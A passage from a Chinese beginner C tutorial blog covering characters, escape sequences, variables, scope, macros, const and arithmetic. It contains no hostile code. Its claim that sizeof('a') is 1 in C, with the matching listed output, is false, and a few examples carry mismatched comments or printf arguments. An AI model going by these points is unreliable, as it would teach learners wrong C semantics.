c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> c = <span class="string">&#x27;a&#x27;</span>;<span class="comment">// c中存储的是字符&#x27;a&#x27;的ASCII码,即97(十进制)</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, c); <span class="comment">// 输出 97</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么反过来,我们当然可以将一个0~127的整数作为ASCII码赋值给char变量,甚至将一个整数在printf中以<code>%c</code>来解释:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">97</span>; <span class="comment">// 97 是 a 的 ASCII 码</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, i); <span class="comment">// 输出 a</span></span><br><span class="line">    <span class="comment">// 98是字符 b 的 ASCII 码,我们直接将其按%c---即字符---输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, <span class="number">98</span>); <span class="comment">// 输出字符 b</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用转义字符来处理特殊字符">使用转义字符来处理特殊字符</h3><p>但不是所有的字符都能直接放在单引号内,例如单引号本身:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 但不是所有的字符都能直接放在单引号内,例如单引号本身:</span></span><br><span class="line">    <span class="comment">// char c = &#x27;&#x27;&#x27;; // 错误</span></span><br><span class="line">    <span class="comment">// 正确的做法是使用转义字符:</span></span><br><span class="line">    <span class="type">char</span> c = <span class="string">&#x27;\&#x27;&#x27;</span>; <span class="comment">// 正确</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, c); <span class="comment">// 输出单引号这个字符 &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于这些字符,我们需要使用转义字符来表示,即将其转义为一般的字符,而不是作为C语言语法的一部分.</p><p>要想使用一个转义字符,只需要简单地在想表示的字符前加一个反斜杠<code>\</code>即可,例如上面的单引号就可以这样表示:</p><p><code>'\''</code>,这是一个整体,仅仅表示一个单引号</p><p>同时,由于反斜杠用于转义,所以它本身也是一个特殊字符,同样,我们在其前面加上一个<code>\</code>来转义它:</p><p><code>'\\'</code>,同样,这是一个整体,仅仅表示一个反斜杠</p><p>有关转义字符还有很多,例如字符串使用一对<code>&quot;&quot;</code>来包括,这时候字符串内部出现的<code>&quot;</code>自然也需要转义.</p><p>另一方面,有一些不可见字符,即空白字符,也需要转义,例如<code>'\n'</code>代表一个换行,<code>'\t'</code>代表一个制表符(通常等价于4个空格).</p><p>我们甚至可以将数字放到字符中,尽管单个的字符我们可以直接用一个数值来表示,但是如果是字符串,这将非常重要!</p><p>转义字符如下:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231007011552875.png" alt="image-20231007011552875" style="zoom:45%;" /></p><h3 id="字符常量">字符常量</h3><p>同时还有一个很多书不会提到,或者说讲的不明确的问题,那就是字符常量到底和int一不一样,这里举一个代码例子,要用到sizeof运算符:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> c=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;char c: %u\n&quot;</span>,<span class="keyword">sizeof</span>(c));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;char: %u\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;int: %u\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\&#x27;a\&#x27;: %u\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&#x27;a&#x27;</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\&#x27;a\&#x27;+1: %u\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&#x27;a&#x27;</span> + <span class="number">1</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\&#x27;a\&#x27;+1: %u\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&#x27;a&#x27;</span> + <span class="string">&#x27;a&#x27;</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出结果:</span></span><br><span class="line"><span class="comment">char: 1</span></span><br><span class="line"><span class="comment">int: 4</span></span><br><span class="line"><span class="comment">&#x27;a&#x27;: 1</span></span><br><span class="line"><span class="comment">&#x27;a&#x27;+1: 4</span></span><br><span class="line"><span class="comment">&#x27;a&#x27;+1: 4</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>这里使用sizeof关键字计算操作数的大小(宽度),也就是占用几字节.</p><p>可以发现,单个字符常量/单个字符变量都占用1字节,而int常量(变量)占用4字节</p><p>但是,一旦char加入了和int整型的运算,那么结果的大小就会立即变成4字节</p><p>甚至只是两个字符常量进行相加(字符对应的ASCII码值相加,而不是连接),结果也立即提升为4字节</p><p>所以我们可以证实:<code>在C语言中,单个的字符常量是1个字节,但是一旦参与运算,就立即提升为4字节,也就是说被解释为(当做)4字节的int常量参与运算</code></p><p>换句话说,你完全可以把C语言中的字符常量当成int来看待!!!这是一个很重要的特性,很多教材,书中都没有提到,或者讲解的不够清晰.</p><h2 id="其他特殊类型">其他特殊类型</h2><p>其他的特殊类型非常重要,但是这里先不进行讲解,本文的主要目的是要让各位建立起对数据类型及其表示范围的概念,后面的几种类型会单独分章节进行讨论,特别是指针,堪称C语言的灵魂,放在好几章里讲解都不为过,甚至在后面的各种应用都离不开指针.</p><h1 id="c语言的数据">C语言的数据</h1><p>C语言中,数据有两种,即常量和变量;</p><p>还有一种实际上属于变量,但是常常被称为常量,或者常变量的数据,就是在变量声明的适当位置加上const这个关键字;</p><p>另外有一种特殊的常量,叫做宏定义,实际上是一种预处理,只是单纯的文本替换,同样十分重要.</p><h2 id="如何声明一个变量">如何声明一个变量</h2><p>注:有关声明的详细内容可见https://zh.cppreference.com/w/c/language/declarations,其他声明将会在后续知识的讲解中逐渐插入.</p><p>变量,顾名思义,就是可以变化的量,用于在程序中存储不断变化的值,或者用于接受我们输入的值(在运行前不确定).</p><p>并且变量不同于常量,在使用前必须进行声明—提前告知编译器这里需要使用到一个变量(需要进行内存分配).</p><p>如前所述,C语言是静态类型语言,声明一个变量,则必须声明其类型(编译前就必须确定其类型):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a; <span class="comment">// 正确,a是一个int类型的变量</span></span><br><span class="line"><span class="type">double</span> pi=<span class="number">3.14</span>; <span class="comment">// 正确,pi是一个double类型的变量,并为其初始化为3.14</span></span><br><span class="line">    <span class="type">float</span> f1=<span class="number">2</span>,f2=<span class="number">3</span>,f3=<span class="number">4</span>; <span class="comment">// 正确,同一条语句中可以声明若干个变量</span></span><br><span class="line">    s; <span class="comment">// 错误,s未定义</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2lf&quot;</span>,pi); <span class="comment">// 输出pi的值,且保留2位小数</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="变量的声明方法">变量的声明方法</h3><p>一个变量声明,遵循以下格式:</p><p>​<code>&lt;类型&gt; &lt;合法的标识符名&gt;;</code></p><p>类型即为上面所述的各种合法的内置类型,或者是自定义的类型(例如结构体类型,枚举类型等等);</p><h3 id="标识符的命名规则">标识符的命名规则</h3><p>这里再重新说明一下:</p><p>标识符即为变量名,在C语言中,标识符的命名有如下几条规则,不遵循这几条规则的标识符均不合法(或者不合适):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> 标识符必须以字母a-z、 A-Z或下划线开头，后面可跟任意个(可为<span class="number">0</span>)字符，这些字符可以是字母、下划线和数字，其他字符不允许出现在标识符中</span><br><span class="line"><span class="number">2</span> 标识符严格区分大小写字母</span><br><span class="line"><span class="number">3</span> 标识符的长度，c89规定<span class="number">31</span>个字符以内，c99规定<span class="number">63</span>个字符以内(没有哪个疯子超出这个范围吧...)</span><br><span class="line"><span class="number">4</span> C语言中的关键字，有特殊意义，不能作为标识符(例如<span class="keyword">if</span>,<span class="keyword">for</span>,<span class="keyword">while</span>,<span class="keyword">goto</span>,<span class="keyword">return</span>等)</span><br><span class="line"><span class="number">5</span> 自定义标识符最好取具有一定意义的字符串，便于记忆和理解</span><br><span class="line"><span class="number">6</span> 不同平台最好遵循各自的命名规范,例如Windows一般使用驼峰命名法,Linux使用下划线命名法</span><br></pre></td></tr></table></figure><p>不好意思地指出,本人的英语水平不太好,而且各种标识符(包括但不限于变量名,函数名,结构体类型,宏定义等)都习惯下划线命名法,可能较长.但希望宁肯变量名长点,也不要一大堆a,b,c,d,e,f,g之类的扔上去,否则以后回头看代码遭罪的只会是你自己.</p><h3 id="变量从哪里声明">变量从哪里声明</h3><p>这里的知识可能涉及到一点作用域和生命周期的问题,但是这里先不讲解—依旧,知识都是交叉的,在该讲什么的时候就讲什么.</p><p>其实核心的就是一句话:<code>在你使用到该变量之前提前声明好他</code></p><p>例如上面的<code>double pi=3.14;</code>我们需要在后面进行输出其值,所以必须在使用printf之前进行该变量的声明,同时对其进行初始化(初始化为3.14).这里的pi在main函数中声明,所以pi也叫<code>局部变量</code>,换句话说,在其他地方(其他函数中)是不允许使用该变量的(找不到pi),因为pi是main()函数私有的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;访问到了pi:%lf&quot;</span>,pi); <span class="comment">// error: &#x27;pi&#x27; was not declared in this scope</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> pi=<span class="number">3.14</span>; <span class="comment">// 正确,pi是一个全局的double类型的变量,并为其初始化为3.14,main函数可以访问到</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2lf\n&quot;</span>,pi); <span class="comment">// 输出pi的值,且保留2位小数</span></span><br><span class="line">    test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这个程序无法通过编译,因为在test函数中无法访问到pi这个变量.</p><p>但是如果我们把pi放在main()函数的前面,同时在任何函数的外面,那么pi就成为了全局变量,任何函数(本源文件内)都有权限访问修改其值,并且pi在程序运行的整个过程一直存在而不会销毁(后面在作用域与生命周期的相关教程会详细解释):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">double</span> pi; <span class="comment">// 正确,pi是一个全局的double类型的变量,并为其初始化为3.14,main函数可以访问到</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;访问到了pi:%lf&quot;</span>,test);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2lf\n&quot;</span>,pi); <span class="comment">// 输出pi的值,且保留2位小数</span></span><br><span class="line">    test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230921202743779.png" alt="image-20230921202743779" style="zoom:33%;" /><p>这里的示例主要体现了两种pi的作用域的不同,暂未展示生命周期的问题,大家现在只需要知道:如果需要一个变量给所有的函数共享,那么请将他作为全局变量,但是,这种操作一定要慎重,除非迫不得已,最好不要将任何变量声明为全局变量—你有可能会在某个函数中不小心修改(破坏)其值—请绝对不要高估你的实力与判断.</p><h2 id="如何使用一个常量">如何使用一个常量</h2><h3 id="常量和变量的区别">常量和变量的区别</h3><p>其实这个问题很显而易见,常量就是不能(或者说不应该)被修改值的量,从逻辑的角度去想,如果某个要被使用到的值确定不会(甚至是绝对不能)被修改(例如宇宙的普朗克常量),那么何不将其直接作为常量写入呢,这是一种思路,下面按照这个思路来写一个求圆表面积的程序:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> r=<span class="number">3</span>; <span class="comment">// 用于存储半径</span></span><br><span class="line"><span class="type">double</span> c; <span class="comment">// 用于存储面积</span></span><br><span class="line">c=<span class="number">3.14</span>*r*r;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lf&quot;</span>,c); <span class="comment">//输出28.260000</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>3.14</code>就是一个浮点型的常量,我们直接将其硬编码到程序中.</p><p>但是有一个问题,如果我们手动指定pi的精度,那么pi就不得不每次进行修改,例如3.14,3.14159,3.1415926535,…如此直接修改程序就显得非常麻烦,而且每一个地方都要进行手动修改,十分繁琐,与其这样,我们还不如将其定义为一个变量.</p><p>但是不得不承认,这里的例子破坏了<code>常量就是不能(或者说不应该)被修改值的量</code>这个前提,但是我们为了说明问题,暂时违反一次…另一方面,我们并不是只有这两种选择,在C中,我们有一种特殊的定义&quot;常量&quot;的方法,那就是<code>宏定义</code>.</p><p>宏定义实际上只是完完全全的文本替换,他类似于你在文本编辑器中&quot;ctrl+h&quot;进行批量的文本替换,我们见如下示例:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.14</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> r=<span class="number">3</span>; <span class="comment">// 用于存储半径</span></span><br><span class="line"><span class="type">double</span> c; <span class="comment">// 用于存储面积</span></span><br><span class="line">c=PI*r*r;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lf\n&quot;</span>,c); <span class="comment">//输出 28.260000</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;PI的值为:%lf\n&quot;</span>,PI); <span class="comment">//输出 PI的值为:3.140000</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>宏定义的定义格式是这样:</p><p><code>#define &lt;宏名&gt; [要替换的内容,可为空]</code></p><p>那么在上面的代码中,我们将程序中所有的PI全部替换成3.14</p><p>可以发现,宏定义实际上是预处理指令(#号代表预处理),也就是说在编译前宏就已经被替换了,所以说宏只是单纯的文本替换</p><p>另一方面,宏处理是从上向下依次执行的,如果先执行的宏替换之后,替换的地方又出现了后执行的宏需要替换的地方,那么这个地方仍然会被再次进行处理,以此类推,直到所有的宏全部被替换完成.</p><p>关于宏的知识还有其他内容,有的用的比较少,有的现在还不能讲解,读者不妨自行查阅—例如&quot;宏函数&quot;,“拼接宏”,&quot;递归宏&quot;等等高级(抽象)用法,有些其实基本不会用到,而有些会常常用到,需要不断的代码积累.</p><h3 id="常量有哪些">常量有哪些</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230923162631074.png" alt="image-20230923162631074"></p><p>实际上很简单的说,单个的数字(例如<code>123</code>,<code>3</code>等),单个的字符(例如<code>'a'</code>),单个的字符串(例如<code>&quot;hello world&quot;</code>),一些编译器预先定义好的常量(例如<code>NULL,其值是0</code>)这些都是合法的常量(或字面量)</p><h3 id="常量的存储问题">常量的存储问题</h3><p>接下来是常量的存储问题.和变量不同,常量存储在常量存储区,而不是像局部变量存储在栈区,全局,静态变量存储在全局(静态)存储区里等等.</p><p>而且字符串是在一个字符常量区中,而且对字符串常量的引用(注意不是C++的引用,而是指使用),实际上是一个指向字符串第一个字符的字符指针,而且一个C程序共享同一个字符串常量—这意味着如果两个字符指针指向同一个字符串常量,那么在内存中实际只有一个这个字符串常量的副本!!!更重要的是,对一个字符串常量进行修改的行为是未定义的!!!有关字符指针的内容会在指针或字符串的相关章节进行详细的讲解(一般的教材是不会讲的doge)</p><h3 id="介于常量和变量之间-常变量的使用">介于常量和变量之间—常变量的使用</h3><p>常变量实质上就是变量,我们使用一个const关键字对变量进行修饰,让他的值不能够被修改:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> S </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> num=<span class="number">10</span>; <span class="comment">// num的值不可被修改</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,num);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>const提供语言层面的保护,编译器会进行一定程度上的识别,如果有修改的行为会进行报错—除了使用指针进行强行修改,但是此时一般程序会直接终止.</p><p>关于const关键字相关的知识将在指针进行更加详细的讲解.</p><p>​—WAHAHA,2023.9.21</p><h1 id="如何使用数据">如何使用数据</h1><p>在此处,我们先引入最基本的几个运算:<code>加减乘除和赋值</code></p><p>对于数据,必然要进行操作使用,我们可以使用最基本两种操作方式:</p><p>1.变量或常量之间可以进行组合运算,例如<code>加减乘除</code>等,并计算出一个最终的值</p><p>3.把计算出的最终的值<code>赋值</code>给一个<code>左值</code>(后面会介绍到左值,这里简单将左值理解为就是<code>变量</code>)</p><h2 id="变量的初始化">变量的初始化</h2><p>数据的操作处理,主要和变量有关,常量作为辅助.那么一个变量,在进行操作之前,应当给他一个初始的值,我们把这种操作叫做<code>初始化</code>.</p><p>例如,我们想要定义一个pi的浮点型变量,并初始化为3.14,应该这样写:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">float</span> pi = <span class="number">3.14</span>;</span><br></pre></td></tr></table></figure><p>也就是说,我们在声明这个变量的同时,直接在pi这个标识符后面跟一个<code>=</code>运算符,后面再跟其初始值即可.</p><p>这里的<code>=</code>叫做<code>赋值运算符</code>, 它的功能是将其右边的&quot;值&quot;赋值给左边的&quot;变量&quot;.</p><p>另一方面,必须要注意的是,赋值运算符在这里实际上并不是赋值的操作,虽然我们使用了<code>=运算符</code>—这显然很符合我们的思维,但是正如标题所写,这里的操作叫做<code>初始化</code>而非<code>赋值</code>!</p><h2 id="为变量赋值">为变量赋值</h2><p>我们在程序的运行当中,一些变量的值会发生变化,也就是说需要重新给他赋一个新的值,那么这时候的操作就叫做<code>赋值</code>,这里使用的<code>=运算符</code>才是真正的赋值含义.</p><p>这里仅仅先知道我们使用<code>=运算符</code>(C语言中这种用于运算操作的符号统称为运算符)对一个变量进行赋值即可.</p><p>例如,我们定义的一个变量原来是3,此时我们想要将其重新变为4,应该这样写:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> var = <span class="number">3</span>; <span class="comment">// 这里是初始化而非赋值</span></span><br><span class="line">var = <span class="number">4</span>; <span class="comment">// 这里进行赋值</span></span><br></pre></td></tr></table></figure><h2 id="变量-常量间进行运算">变量/常量间进行运算</h2><p>注:由于仅仅学了几种基本类型,我们仅拿四则运算的运算符来举例,实际上C语言支持的运算符远远不仅于此.</p><p>很显然,我们使用<code>+-*/</code>这4个运算符进行<code>四则运算</code>,他们的运算行为和数学意义完全相同,例如如果除数是0则会出现错误.</p><p>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>, b = <span class="number">4</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a + b); <span class="comment">// 计算结果是一个int类型值,因此使用%d输出</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然,输出的结果是<code>7</code></p><p>又如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">8</span>, b = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a / b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然,输出的结果是<code>4</code></p><br><p>再例如我们想要计算浮点数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">double</span> a = <span class="number">3</span>, b = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lf&quot;</span>, a / b); <span class="comment">// 计算结果是一个double类型值,因此使用%lf输出</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者使用float(精度要求较低时):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">float</span> a = <span class="number">3</span>, b = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%f&quot;</span>, a / b); <span class="comment">// 计算结果是一个float类型值,因此使用%f输出</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注:实际上<code>printf()</code>函数会将所有的float类型值<code>提升</code>为double类型,因此用<code>%lf</code>输出float类型值也没有问题.</p><br><p>另外,我们可以连续进行使用:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>, b = <span class="number">2</span>, c = <span class="number">5</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a + b * c); <span class="comment">// 输出结果为13</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这里我们也能看出四则运算和其数学意义相同,乘除法的优先级依旧高于加减法,所以结果是13.</p><p>那么如果想要强制先运算<code>a+b</code>,我们加上小括号即可,同时小括号可嵌套使用!</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">3</span>, b = <span class="number">2</span>, c = <span class="number">5</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, (a 